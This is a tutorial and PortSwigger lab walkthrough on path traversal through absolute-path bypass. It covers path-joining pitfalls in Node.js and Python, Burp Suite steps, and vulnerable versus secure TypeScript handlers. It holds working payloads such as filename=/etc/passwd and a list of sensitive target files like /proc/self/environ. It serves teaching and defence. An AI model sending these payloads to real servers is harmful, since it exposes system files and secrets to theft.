@@ -1,0 +1,231 @@
+# Directory Traversal: Bypassing with Absolute Path
+
+**Directory Traversal** (also known as **File Path Traversal**) is a critical web security vulnerability that enables attackers to read arbitrary files stored on the server's filesystem running the application.
+
+Exposed files can range from backend application source code and environment configuration secrets (`.env`) to operating system files like `/etc/passwd` on Linux or `C:\windows\win.ini` on Windows.
+
+A common bypass technique occurs when security controls only strip or block relative traversal sequences (`../`), allowing attackers to supply an **Absolute Path** instead.
+
+---
+
+## 1. Vulnerability Concept: Why Does Absolute Path Bypass Work?
+
+In web applications that serve dynamic images or downloadable documents, servers often retrieve files using a user-controllable request parameter:
+
+```http
+GET /image?filename=53.jpg HTTP/1.1
+Host: target-website.com
+```
+
+To prevent directory escaping, developers often implement basic input filters designed to catch dot-dot-slash (`../`) patterns.
+
+### The Flaw of Naive Blacklist Filtering
+If the backend filter strictly searches for the substring `../`, attackers can omit relative directory stepping altogether. Instead, they can provide an **Absolute Path** starting from the filesystem root (`/`):
+
+```http
+GET /image?filename=/etc/passwd HTTP/1.1
+```
+
+Because `/etc/passwd` does not contain the `../` substring, the blacklist filter evaluates it as safe and passes the path directly to the file retrieval function!
+
+---
+
+## 2. Backend Path Resolution Behavior (Programming Gotchas)
+
+Beyond filter flaws, standard path-joining functions in multiple programming languages exhibit specific behaviors when encountering an absolute path:
+
+### ⚠️ Node.js Behavior (`path.resolve`):
+```javascript
+const baseDir = "/var/www/images";
+const userInput = "/etc/passwd";
+
+// path.resolve treats leading "/" as an absolute path from root, ignoring baseDir!
+const finalPath = path.resolve(baseDir, userInput);
+console.log(finalPath); // Output: "/etc/passwd" (NOT /var/www/images/etc/passwd)
+```
+
+### ⚠️ Python Behavior (`os.path.join`):
+```python
+import os
+base_dir = "/var/www/images"
+user_input = "/etc/passwd"
+
+# os.path.join discards all previous path components when a component begins with "/"!
+final_path = os.path.join(base_dir, user_input)
+print(final_path) # Output: "/etc/passwd"
+```
+
+Consequently, functions like `fs.readFileSync()` or `open()` directly read from the root filesystem!
+
+---
+
+## 3. Exploitation Flow: Absolute Path Bypass
+
+![Directory Traversal Absolute Path Bypass](/images/directory-traversal-absolute-path.svg)
+
+---
+
+## 4. Common Target Files Across Operating Systems
+
+When verifying Directory Traversal vulnerabilities, ethical testers routinely target standard proof-of-concept files:
+
+### Linux / Unix Systems:
+| File Location | Description & Information Value |
+| :--- | :--- |
+| **`/etc/passwd`** | Contains list of local system user accounts, home directories, and default login shells. |
+| **`/etc/hosts`** | Local hostname to IP address mappings. |
+| **`/etc/os-release`** / **`/etc/issue`** | OS distribution and kernel release details. |
+| **`/proc/self/environ`** | Process environment variables (frequently reveals API secrets and database passwords). |
+| **`/var/log/apache2/access.log`** | Web server access logs. |
+
+### Windows Systems:
+| File Location | Description & Information Value |
+| :--- | :--- |
+| **`C:\windows\win.ini`** | Basic Windows system configuration file (standard PoC for Windows path traversal). |
+| **`C:\windows\system32\drivers\etc\hosts`** | Windows local hosts configuration. |
+| **`C:\boot.ini`** | Legacy Windows boot configuration file. |
+
+---
+
+## 5. Step-by-Step Practical Exploitation with Burp Suite
+
+Follow this guide to solve the PortSwigger lab scenario (*File path traversal, traversal sequences blocked with absolute path bypass*):
+
+---
+
+### Step 1: Locate the File Retrieval Endpoint
+1. Open the embedded **Burp Suite** browser and visit the product catalog.
+2. Inspect product images on the store page. Right-click an image and select **Inspect**, or check **Proxy** > **HTTP history**.
+3. Identify the image retrieval request:
+   ```http
+   GET /image?filename=48.jpg HTTP/1.1
+   Host: target-lab.net
+   ```
+
+---
+
+### Step 2: Send the Request to Burp Repeater
+1. Right-click the `GET /image?filename=48.jpg` request.
+2. Click **Send to Repeater** (`Ctrl + R` / `Cmd + R`).
+3. Switch to the **Repeater** tab.
+
+---
+
+### Step 3: Test Standard Relative Traversal (Observe Block)
+1. Attempt a standard relative path traversal:
+   ```http
+   GET /image?filename=../../../etc/passwd HTTP/1.1
+   ```
+2. Click **Send**.
+3. The server responds with an error (e.g. `400 Bad Request` or `404 Not Found`), indicating `../` sequences are blocked or stripped.
+
+---
+
+### Step 4: Apply Absolute Path Payload
+1. Replace the `filename` parameter value with an absolute path to `/etc/passwd`:
+
+```http
+GET /image?filename=/etc/passwd HTTP/1.1
+Host: target-lab.net
+Cookie: session=xyz...
+```
+
+2. Click **Send**.
+
+---
+
+### Step 5: Analyze the Response
+1. Examine the **Response** panel on the right.
+2. The server responds with status **`200 OK`** and returns the contents of `/etc/passwd`:
+
+```http
+HTTP/1.1 200 OK
+Content-Type: image/jpeg
+Content-Length: 1345
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+carlos:x:1001:1001:Carlos:/home/carlos:/bin/bash
+peter:x:1002:1002:Peter:/home/peter:/bin/bash
+```
+
+3. The system file has been successfully exposed and the lab is marked **Solved**! 🎉
+
+---
+
+## 6. Backend Source Code: Vulnerable vs. Secure
+
+### ❌ Vulnerable Implementation (Naive `../` Filter)
+```typescript
+import path from "path";
+import fs from "fs";
+
+app.get("/image", (req, res) => {
+  const baseDir = "/var/www/public/images";
+  const filename = req.query.filename as string;
+
+  // ❌ INSUFFICIENT FILTER: Only checks for "../"
+  if (filename.includes("../")) {
+    return res.status(400).send("Traversal sequences forbidden!");
+  }
+
+  // ❌ path.resolve discards baseDir when filename begins with "/"
+  const targetPath = path.resolve(baseDir, filename);
+
+  if (fs.existsSync(targetPath)) {
+    return res.sendFile(targetPath); // Leaks /etc/passwd!
+  }
+
+  return res.status(404).send("File not found.");
+});
+```
+
+---
+
+### ✅ Secure Implementation (Strict Regex Whitelist & Canonical Path Verification)
+```typescript
+import path from "path";
+import fs from "fs";
+
+app.get("/image", (req, res) => {
+  const BASE_DIR = path.resolve("/var/www/public/images");
+  const filename = req.query.filename as string;
+
+  // 1. Whitelist Validation: Enforce strict alphanumeric and valid extension patterns
+  const isFilenameSafe = /^[a-zA-Z0-9_-]+\.(jpg|jpeg|png|gif|webp)$/.test(filename);
+  if (!isFilenameSafe) {
+    return res.status(400).json({ error: "Invalid filename format." });
+  }
+
+  // 2. Canonical Path Resolution & Containment Verification
+  const targetPath = path.resolve(BASE_DIR, filename);
+
+  // Ensure resolved path strictly resides inside BASE_DIR
+  if (!targetPath.startsWith(BASE_DIR + path.sep)) {
+    return res.status(403).json({ error: "Access outside working directory denied." });
+  }
+
+  // 3. Verify file existence before serving
+  if (!fs.existsSync(targetPath)) {
+    return res.status(404).json({ error: "File not found." });
+  }
+
+  return res.sendFile(targetPath);
+});
+```
+
+---
+
+## 7. Mitigation Strategies & Best Practices
+
+1. **Avoid Passing User-Controlled Strings to Filesystem APIs:**
+   Map media files to randomized database identifiers (e.g. UUID v4) rather than raw filesystem names.
+2. **Implement Strict Whitelist Input Validation:**
+   Reject any input containing `/`, `\`, null bytes `%00`, or multiple dots `..`.
+3. **Verify Canonical Paths (`startsWith(BASE_DIR)`):**
+   Normalize paths using canonicalization functions (`path.resolve` or `realpath`) and enforce that target files remain within the authorized base directory.
+4. **Enforce Principle of Least Privilege:**
+   Execute web services under isolated, low-privilege OS accounts (e.g. `www-data`) and utilize containerization or chroot jails to constrain filesystem scope.
